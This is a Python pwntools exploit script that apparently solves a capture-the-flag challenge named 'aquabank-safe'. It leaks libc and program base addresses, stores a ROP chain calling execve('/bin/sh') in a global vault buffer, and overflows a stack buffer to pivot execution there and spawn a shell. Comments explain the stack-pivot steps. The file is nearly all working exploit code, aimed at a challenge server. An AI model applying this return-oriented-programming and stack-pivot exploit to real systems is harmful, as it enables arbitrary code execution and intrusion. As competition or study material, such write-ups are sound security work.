#!/usr/bin/env python3

from pwn import *
"""
The idea is to exploit the stack pivoting using the global buffer VAULT
So we "create" a fake frame
Step 1) Derive libc_base address starting from the leak addresses given us
Step 2) Store the ROP CHAIN that spawn the shell inside  VAULT 
Step 3) Pivoting the execution into VAULT by overwrite the RBP of open safe function with the address of VAUL, so when LEAVE 
        is executed the address of VAULT became the new RSP and the execution continue from that point





"""
exe = ELF("./aquabank-safe_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.log_level="debug"
OFFSET_TO_RIP_OPEN_SAFE = 8+8

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it", 13599)

    return r


def main():
    p = conn()

#--------------- STAGE 1: DERIVE THE LIBC/PIE BASE ADDRESES ---------------
    p.recvuntil(b"> ")
    p.sendline(b"1")
    #log.info(f"")
    p.recvuntil(b"@")
    #gdb.attach(p)
    leak = p.recvline().strip()
    leak = int(leak, 16)
    
    #log.info(f"LEAK={hex(leak)}")
    libc.address = libc_base=leak- libc.symbols['printf']
    #log.info(f"LIBC BASE={hex(libc_base)}")
    #log.info(f"libc.symbols {hex(libc.symbols['printf'])}")
    
    p.recvuntil(b'entry  @ ')
    pie_leak = int(p.recvline().strip(), 16)
    pie_base = pie_leak - exe.symbols['diagnostics']
    #log.info(f"PIE BASE={hex(pie_base)}")
    print(hex(libc_base))
    print(hex(pie_base))
    rop = ROP(exe)
    rop_libc = ROP(libc)

    POP_RDI = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
    POP_RAX = rop_libc.find_gadget(['pop rax', 'ret'])[0]
    POP_RSI = rop_libc.find_gadget(['pop rsi', 'ret'])[0]
    XCHG_EDX_EAX =libc.address + 0x11ea8a
    LEAVE   = rop_libc.find_gadget(['leave', 'ret'])[0]
    RET     = rop.find_gadget(['ret'])[0]
    RET_LIBC= rop_libc.find_gadget(['ret'])[0]
    BINSH =  next(libc.search(b"/bin/sh"))
    VAULT =   pie_base + exe.symbols['vault']


    log.info(f"POP_RDI={hex(POP_RDI)}")
    log.info(f"POP_RAX={hex(POP_RAX)}")
    log.info(f"POP_RSI={hex(POP_RSI)}")
    log.info(f"XCHG_EDX_EAX={hex(XCHG_EDX_EAX)}")
    log.info(f"LEAVE={hex(LEAVE)}")
    log.info(f"RET_LIBC={hex(RET_LIBC)}")
    log.info(f"BINSH={hex(BINSH)}")
    p.recvuntil(b"> ")
    
#--------------- STAGE 2: PREPARE/STORE THE ROP CHAIN IN TO THE VAULT BUFFER ---------------
    p.sendline(b"2")
    print(p.recvuntil(b"[deposit] Vault deposit size (bytes): "))

    p.sendline(b"16000")
    print(p.recvline())
  
    #execve call --> RDI="function_to_call", RSI=0, RDX=0
    log.info(f"VAULT ADDR:{hex( VAULT)}")
    rop_chain = flat(
        # p64(ret),
        # b"A" * 16,
        b"A" * 8,
        # p64(0x0),
        p64(RET_LIBC),
        p64(POP_RDI),p64(BINSH),

        p64(POP_RSI),p64(0),

        p64(POP_RAX), p64(0),   # since POP RDX in not avaiable we can use the first part(8bit) of RAX an 
                                #then exchange it with the first part (8bit) of RDX
        p64(XCHG_EDX_EAX), # RDX = RAX
        
        p64(RET_LIBC),
        p64(libc.symbols["execve"]),
    )

   # p.sendline(str(len(rop_chain)).encode())
    p.sendline(rop_chain)
    

#--------------- STAGE 3: EXPLOIT BOF IN ORDER TO "MOVE" THE EXECUTION INO THE VAULT ADDRESES ---------------
    p.recvuntil(b"> ")

    p.sendline(b"3")
    p.recvuntil(b"combination:\n")


    pause()
    payload_stage2 = flat(
        b"A" * 8,
        p64(VAULT), #put the VAULT address on the stack
        p64(LEAVE)  #The leave instruction do the following set of instruction
                    #MOV RSP, RBP 
                    #POP RBP 
                    #so when the rop chain will be execute the RBP addres will we overwrited with the addres of VAULT  
                    # then when MOV RSP, EBP is executed the VAULT addres become the next RSP and the execution start
                    # from the addres of VAULT 
    
    )
    p.sendline(payload_stage2)
    


    p.interactive()


if __name__ == "__main__":
    main()
